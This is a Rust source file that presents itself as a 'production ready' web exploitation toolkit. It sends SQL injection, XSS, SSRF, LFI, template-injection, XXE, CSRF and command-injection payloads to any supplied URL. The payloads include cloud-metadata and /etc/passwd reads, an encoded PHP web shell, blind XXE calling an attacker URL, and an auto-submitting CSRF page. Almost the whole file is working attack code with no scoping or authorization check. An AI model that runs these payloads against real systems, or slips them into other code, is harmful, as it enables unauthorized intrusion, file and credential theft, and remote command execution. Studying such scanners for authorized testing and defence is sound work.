use std::collections::HashMap;
use std::time::Duration;
use reqwest::blocking::Client;

// ═══════════════════════════════════════════════════════════════════════════
// WEB EXPLOITATION TOOLKIT - PRODUCTION READY
// ═══════════════════════════════════════════════════════════════════════════

// Constants for web exploitation
const DEFAULT_HTTP_TIMEOUT_SECS: u64 = 10;
const XSS_TEST_TIMEOUT_SECS: u64 = 5;
const SSRF_TIMEOUT_SECS: u64 = 3;

// ────────────────────────────────────────────────────────────────────────────
// SQL INJECTION
// ────────────────────────────────────────────────────────────────────────────

pub struct SQLInjectionTester {
    payloads: Vec<String>,
    error_patterns: Vec<String>,
}

impl SQLInjectionTester {
    /// Creates a new SQL injection tester with common payloads
    pub fn new() -> Self {
        let payloads = vec![
            "' OR '1'='1".to_string(),
            "' OR '1'='1' --".to_string(),
            "' OR '1'='1' /*".to_string(),
            "admin' --".to_string(),
            "admin' #".to_string(),
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL--".to_string(),
            "' AND 1=1--".to_string(),
            "' AND 1=2--".to_string(),
            "1' ORDER BY 1--".to_string(),
            "1' ORDER BY 2--".to_string(),
            "1' ORDER BY 3--".to_string(),
            "' AND SLEEP(5)--".to_string(),
            "'; WAITFOR DELAY '0:0:5'--".to_string(),
            "' || pg_sleep(5)--".to_string(),
        ];
        
        let error_patterns = vec![
            "SQL syntax".to_string(),
            "mysql_fetch".to_string(),
            "ORA-".to_string(),
            "PostgreSQL".to_string(),
            "Microsoft SQL".to_string(),
            "ODBC".to_string(),
            "SQLite".to_string(),
            "syntax error".to_string(),
        ];
        
        SQLInjectionTester { payloads, error_patterns }
    }
    
    /// Tests a URL for SQL injection vulnerabilities
    pub fn test_url(&self, url: &str, param: &str) -> Result<Vec<String>, String> {
        // Input validation
        if url.is_empty() || param.is_empty() {
            return Err("URL and parameter cannot be empty".to_string());
        }
        
        let client = Client::builder()
            .timeout(Duration::from_secs(DEFAULT_HTTP_TIMEOUT_SECS))
            .build()
            .map_err(|e| format!("Client error: {}", e))?;
        
        let mut vulnerable = Vec::new();
        
        log::info!("Testing {} with parameter '{}'", url, param);
        
        for (i, payload) in self.payloads.iter().enumerate() {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
            
            match client.get(&test_url).send() {
                Ok(response) => {
                    let body = response.text().unwrap_or_default();
                    
                    for pattern in &self.error_patterns {
                        if body.contains(pattern) {
                            let vuln = format!("VULNERABLE: Payload #{}: {} (Pattern: {})", i+1, payload, pattern);
                            log::warn!("{}", vuln);
                            vulnerable.push(vuln);
                            break;
                        }
                    }
                }
                Err(e) => {
                    log::debug!("Request failed for payload {}: {}", payload, e);
                    continue;
                }
            }
        }
        
        if vulnerable.is_empty() {
            log::info!("No obvious SQL injection found");
        }
        
        Ok(vulnerable)
    }
    
    /// Generates a UNION-based SQL injection payload
    pub fn generate_union_payload(&self, columns: usize) -> String {
        let nulls = vec!["NULL"; columns].join(",");
        format!("' UNION SELECT {}--", nulls)
    }
    
    pub fn time_based_payload(&self, database: &str) -> String {
        match database {
            "mysql" => "' AND SLEEP(5)--".to_string(),
            "mssql" => "'; WAITFOR DELAY '0:0:5'--".to_string(),
            "postgres" => "' || pg_sleep(5)--".to_string(),
            _ => "' AND SLEEP(5)--".to_string(),
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// XSS (CROSS-SITE SCRIPTING)
// ────────────────────────────────────────────────────────────────────────────

pub struct XSSChecker {
    payloads: Vec<String>,
}

impl XSSChecker {
    pub fn new() -> Self {
        let payloads = vec![
            "<script>alert('XSS')</script>".to_string(),
            "<img src=x onerror=alert('XSS')>".to_string(),
            "<svg/onload=alert('XSS')>".to_string(),
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
            "<iframe src=javascript:alert('XSS')>".to_string(),
            "<body onload=alert('XSS')>".to_string(),
            "<input onfocus=alert('XSS') autofocus>".to_string(),
            "<marquee onstart=alert('XSS')>".to_string(),
            "<details open ontoggle=alert('XSS')>".to_string(),
            "javascript:alert('XSS')".to_string(),
            "<img src=\"x\" onerror=\"alert(1)\">".to_string(),
        ];
        
        XSSChecker { payloads }
    }
    
    pub fn test_url(&self, url: &str, param: &str) -> Result<Vec<String>, String> {
        let client = Client::new();
        let mut reflected = Vec::new();
        
        println!("[XSS] Testing {} with parameter '{}'", url, param);
        
        for (i, payload) in self.payloads.iter().enumerate() {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
            
            match client.get(&test_url).send() {
                Ok(response) => {
                    let body = response.text().unwrap_or_default();
                    
                    if body.contains(payload) {
                        let vuln = format!("REFLECTED: Payload #{}: {}", i+1, payload);
                        println!("[XSS] WARNING: {}", vuln);
                        reflected.push(vuln);
                    }
                }
                Err(_) => continue,
            }
        }
        
        if reflected.is_empty() {
            println!("[XSS] [OK] No reflected XSS found");
        }
        
        Ok(reflected)
    }
    
    pub fn generate_custom_payload(&self, alert_msg: &str) -> String {
        format!("<script>alert('{}')</script>", alert_msg)
    }
    
    pub fn bypass_filter(&self, blocked_chars: &[char]) -> Vec<String> {
        let mut bypasses = Vec::new();
        
        if !blocked_chars.contains(&'<') {
            bypasses.push("<svg/onload=alert(1)>".to_string());
        }
        
        bypasses.push("javascript:alert(1)".to_string());
        bypasses.push("data:text/html,<script>alert(1)</script>".to_string());
        
        bypasses
    }
}

// ────────────────────────────────────────────────────────────────────────────
// SSRF (SERVER-SIDE REQUEST FORGERY)
// ────────────────────────────────────────────────────────────────────────────

pub struct SSRFTester {
    payloads: Vec<String>,
}

impl SSRFTester {
    pub fn new() -> Self {
        let payloads = vec![
            "http://127.0.0.1/".to_string(),
            "http://localhost/".to_string(),
            "http://[::1]/".to_string(),
            "http://169.254.169.254/latest/meta-data/".to_string(), // AWS metadata
            "http://metadata.google.internal/".to_string(), // GCP metadata
            "file:///etc/passwd".to_string(),
            "file:///c:/windows/win.ini".to_string(),
            "http://0.0.0.0/".to_string(),
            "http://2130706433/".to_string(), // 127.0.0.1 in decimal
            "http://0x7f000001/".to_string(), // 127.0.0.1 in hex
        ];
        
        SSRFTester { payloads }
    }
    
    pub fn test_url(&self, url: &str, param: &str) -> Result<Vec<String>, String> {
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(5))
            .build()
            .map_err(|e| format!("Client error: {}", e))?;
        
        let mut vulnerable = Vec::new();
        
        println!("[SSRF] Testing {} with parameter '{}'", url, param);
        
        for (i, payload) in self.payloads.iter().enumerate() {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
            
            match client.get(&test_url).send() {
                Ok(response) => {
                    let body = response.text().unwrap_or_default();
                    
                    if body.contains("root:") || body.contains("[extensions]") || 
                       body.contains("ami-id") || body.contains("instance-id") {
                        let vuln = format!("POTENTIAL SSRF: Payload #{}: {}", i+1, payload);
                        println!("[SSRF] WARNING: {}", vuln);
                        vulnerable.push(vuln);
                    }
                }
                Err(_) => continue,
            }
        }
        
        if vulnerable.is_empty() {
            println!("[SSRF] [OK] No obvious SSRF found");
        }
        
        Ok(vulnerable)
    }
    
    pub fn cloud_metadata_urls(&self) -> HashMap<&str, &str> {
        let mut urls = HashMap::new();
        urls.insert("aws", "http://169.254.169.254/latest/meta-data/");
        urls.insert("gcp", "http://metadata.google.internal/computeMetadata/v1/");
        urls.insert("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01");
        urls
    }
}

// ────────────────────────────────────────────────────────────────────────────
// LFI/RFI (LOCAL/REMOTE FILE INCLUSION)
// ────────────────────────────────────────────────────────────────────────────

pub struct LFITester {
    payloads: Vec<String>,
}

impl LFITester {
    pub fn new() -> Self {
        let payloads = vec![
            "../../../etc/passwd".to_string(),
            "..\\..\\..\\windows\\win.ini".to_string(),
            "....//....//....//etc/passwd".to_string(),
            "/etc/passwd".to_string(),
            "c:\\windows\\win.ini".to_string(),
            "php://filter/convert.base64-encode/resource=index.php".to_string(),
            "php://input".to_string(),
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=".to_string(),
            "expect://id".to_string(),
            "file:///etc/passwd".to_string(),
        ];
        
        LFITester { payloads }
    }
    
    pub fn test_url(&self, url: &str, param: &str) -> Result<Vec<String>, String> {
        let client = Client::new();
        let mut vulnerable = Vec::new();
        
        println!("[LFI] Testing {} with parameter '{}'", url, param);
        
        for (i, payload) in self.payloads.iter().enumerate() {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
            
            match client.get(&test_url).send() {
                Ok(response) => {
                    let body = response.text().unwrap_or_default();
                    
                    if body.contains("root:x:") || body.contains("[extensions]") || 
                       body.contains("<?php") {
                        let vuln = format!("VULNERABLE: Payload #{}: {}", i+1, payload);
                        println!("[LFI] WARNING: {}", vuln);
                        vulnerable.push(vuln);
                    }
                }
                Err(_) => continue,
            }
        }
        
        if vulnerable.is_empty() {
            println!("[LFI] [OK] No obvious LFI found");
        }
        
        Ok(vulnerable)
    }
    
    pub fn php_wrapper_payloads(&self) -> Vec<String> {
        vec![
            "php://filter/convert.base64-encode/resource=index.php".to_string(),
            "php://input".to_string(),
            "data://text/plain,<?php system($_GET['cmd']);?>".to_string(),
            "expect://id".to_string(),
        ]
    }
}

// ────────────────────────────────────────────────────────────────────────────
// TEMPLATE INJECTION (SSTI)
// ────────────────────────────────────────────────────────────────────────────

pub struct TemplateInjectionTester {
    payloads: HashMap<String, Vec<String>>,
}

impl TemplateInjectionTester {
    pub fn new() -> Self {
        let mut payloads = HashMap::new();
        
        payloads.insert("jinja2".to_string(), vec![
            "{{7*7}}".to_string(),
            "{{config}}".to_string(),
            "{{config.items()}}".to_string(),
            "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
        ]);
        
        payloads.insert("twig".to_string(), vec![
            "{{7*7}}".to_string(),
            "{{_self}}".to_string(),
            "{{_self.env.registerUndefinedFilterCallback('exec')}}".to_string(),
        ]);
        
        payloads.insert("freemarker".to_string(), vec![
            "${7*7}".to_string(),
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}".to_string(),
        ]);
        
        payloads.insert("velocity".to_string(), vec![
            "#set($x=7*7)$x".to_string(),
            "#set($rt = $x.class.forName('java.lang.Runtime'))".to_string(),
        ]);
        
        TemplateInjectionTester { payloads }
    }
    
    pub fn test_url(&self, url: &str, param: &str) -> Result<Vec<String>, String> {
        let client = Client::new();
        let mut vulnerable = Vec::new();
        
        println!("[SSTI] Testing {} with parameter '{}'", url, param);
        
        for (engine, payloads) in &self.payloads {
            for (i, payload) in payloads.iter().enumerate() {
                let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
                
                match client.get(&test_url).send() {
                    Ok(response) => {
                        let body = response.text().unwrap_or_default();
                        
                        if body.contains("49") || body.contains("config") || 
                           body.contains("subclasses") {
                            let vuln = format!("POTENTIAL {} SSTI: Payload #{}: {}", engine, i+1, payload);
                            println!("[SSTI] WARNING: {}", vuln);
                            vulnerable.push(vuln);
                        }
                    }
                    Err(_) => continue,
                }
            }
        }
        
        if vulnerable.is_empty() {
            println!("[SSTI] [OK] No template injection found");
        }
        
        Ok(vulnerable)
    }
}

// ────────────────────────────────────────────────────────────────────────────
// XXE (XML EXTERNAL ENTITY)
// ────────────────────────────────────────────────────────────────────────────

pub struct XXETester;

impl XXETester {
    pub fn generate_payload_file(&self, file_path: &str) -> String {
        format!(r#"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file://{}" >]>
<foo>&xxe;</foo>"#, file_path)
    }
    
    pub fn generate_payload_url(&self, url: &str) -> String {
        format!(r#"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "{}" >]>
<foo>&xxe;</foo>"#, url)
    }
    
    pub fn blind_xxe_payload(&self, attacker_url: &str) -> String {
        format!(r#"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{}">
%xxe;
]>"#, attacker_url)
    }
    
    pub fn test_endpoint(&self, url: &str, payload: &str) -> Result<String, String> {
        let client = Client::new();
        
        println!("[XXE] Testing {}", url);
        
        match client.post(url)
            .header("Content-Type", "application/xml")
            .body(payload.to_string())
            .send() {
            Ok(response) => {
                let body = response.text().unwrap_or_default();
                
                if body.contains("root:") || body.contains("[extensions]") {
                    println!("[XXE] WARNING: VULNERABLE to XXE");
                    Ok(body)
                } else {
                    println!("[XXE] [OK] No XXE detected");
                    Ok(body)
                }
            }
            Err(e) => Err(format!("Request failed: {}", e))
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// CSRF (CROSS-SITE REQUEST FORGERY)
// ────────────────────────────────────────────────────────────────────────────

pub struct CSRFHelper;

impl CSRFHelper {
    pub fn generate_html_poc(&self, target_url: &str, method: &str, params: &HashMap<String, String>) -> String {
        let form_fields: Vec<String> = params.iter()
            .map(|(k, v)| format!(r#"<input type="hidden" name="{}" value="{}">"#, k, v))
            .collect();
        
        format!(r#"<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<form action="{}" method="{}">
{}
<input type="submit" value="Submit">
</form>
<script>
// Auto-submit
document.forms[0].submit();
</script>
</body>
</html>"#, target_url, method, form_fields.join("\n"))
    }
    
    pub fn generate_img_csrf(&self, url: &str) -> String {
        format!(r#"<img src="{}" style="display:none">"#, url)
    }
    
    pub fn check_protection(&self, url: &str) -> Result<bool, String> {
        let client = Client::new();
        
        match client.get(url).send() {
            Ok(response) => {
                let headers = response.headers();
                let has_samesite = headers.get("set-cookie")
                    .and_then(|v| v.to_str().ok())
                    .map(|s| s.contains("SameSite"))
                    .unwrap_or(false);
                
                let body = response.text().unwrap_or_default();
                let has_token = body.contains("csrf") || body.contains("token") || body.contains("_token");
                
                if has_samesite || has_token {
                    println!("[CSRF] [OK] CSRF protection detected");
                    Ok(true)
                } else {
                    println!("[CSRF] WARNING: No obvious CSRF protection");
                    Ok(false)
                }
            }
            Err(e) => Err(format!("Request failed: {}", e))
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// COMMAND INJECTION
// ────────────────────────────────────────────────────────────────────────────

pub struct CommandInjectionTester {
    payloads: Vec<String>,
}

impl CommandInjectionTester {
    pub fn new() -> Self {
        let payloads = vec![
            "; id".to_string(),
            "| id".to_string(),
            "|| id".to_string(),
            "& id".to_string(),
            "&& id".to_string(),
            "`id`".to_string(),
            "$(id)".to_string(),
            "; whoami".to_string(),
            "| whoami".to_string(),
            "; sleep 5".to_string(),
            "| sleep 5".to_string(),
        ];
        
        CommandInjectionTester { payloads }
    }
    
    pub fn test_url(&self, url: &str, param: &str) -> Result<Vec<String>, String> {
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(7))
            .build()
            .map_err(|e| format!("Client error: {}", e))?;
        
        let mut vulnerable = Vec::new();
        
        println!("[CMD-INJ] Testing {} with parameter '{}'", url, param);
        
        for (i, payload) in self.payloads.iter().enumerate() {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
            
            let start = std::time::Instant::now();
            match client.get(&test_url).send() {
                Ok(response) => {
                    let elapsed = start.elapsed();
                    let body = response.text().unwrap_or_default();
                    
                    if body.contains("uid=") || body.contains("gid=") || 
                       (payload.contains("sleep") && elapsed.as_secs() >= 4) {
                        let vuln = format!("VULNERABLE: Payload #{}: {}", i+1, payload);
                        println!("[CMD-INJ] WARNING: {}", vuln);
                        vulnerable.push(vuln);
                    }
                }
                Err(_) => continue,
            }
        }
        
        if vulnerable.is_empty() {
            println!("[CMD-INJ] [OK] No command injection found");
        }
        
        Ok(vulnerable)
    }
}

// ────────────────────────────────────────────────────────────────────────────
// DIRECTORY TRAVERSAL
// ────────────────────────────────────────────────────────────────────────────

pub struct DirectoryTraversalTester {
    payloads: Vec<String>,
}

impl DirectoryTraversalTester {
    pub fn new() -> Self {
        let payloads = vec![
            "../".to_string(),
            "../../".to_string(),
            "../../../".to_string(),
            "../../../../".to_string(),
            "../../../../../".to_string(),
            "..\\".to_string(),
            "..\\..\\".to_string(),
            "..\\..\\..\\".to_string(),
            "....//".to_string(),
            "....\\\\".to_string(),
        ];
        
        DirectoryTraversalTester { payloads }
    }
    
    pub fn test_url(&self, url: &str, param: &str, target_file: &str) -> Result<Vec<String>, String> {
        let client = Client::new();
        let mut vulnerable = Vec::new();
        
        println!("[DIR-TRAV] Testing {} with parameter '{}' for file '{}'", url, param, target_file);
        
        for (i, payload) in self.payloads.iter().enumerate() {
            let full_payload = format!("{}{}", payload, target_file);
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(&full_payload));
            
            match client.get(&test_url).send() {
                Ok(response) => {
                    let body = response.text().unwrap_or_default();
                    
                    if body.contains("root:") || body.contains("[extensions]") {
                        let vuln = format!("VULNERABLE: Payload #{}: {}", i+1, full_payload);
                        println!("[DIR-TRAV] WARNING: {}", vuln);
                        vulnerable.push(vuln);
                    }
                }
                Err(_) => continue,
            }
        }
        
        if vulnerable.is_empty() {
            println!("[DIR-TRAV] [OK] No directory traversal found");
        }
        
        Ok(vulnerable)
    }
}

// ────────────────────────────────────────────────────────────────────────────
// WEB SCANNER (ALL-IN-ONE)
// ────────────────────────────────────────────────────────────────────────────

pub struct WebScanner;

impl WebScanner {
    pub fn scan_all(&self, url: &str, param: &str) -> Result<(), String> {
        println!("\n[WEB-SCAN] Starting comprehensive web vulnerability scan");
        println!("[WEB-SCAN] Target: {}", url);
        println!("[WEB-SCAN] Parameter: {}\n", param);
        
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        println!("SQL Injection Test");
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        let sqli = SQLInjectionTester::new();
        sqli.test_url(url, param)?;
        
        println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        println!("XSS Test");
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        let xss = XSSChecker::new();
        xss.test_url(url, param)?;
        
        println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        println!("SSRF Test");
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        let ssrf = SSRFTester::new();
        ssrf.test_url(url, param)?;
        
        println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        println!("LFI Test");
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        let lfi = LFITester::new();
        lfi.test_url(url, param)?;
        
        println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        println!("Command Injection Test");
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        let cmd = CommandInjectionTester::new();
        cmd.test_url(url, param)?;
        
        println!("\n[WEB-SCAN] [OK] Scan complete!");
        
        Ok(())
    }
}
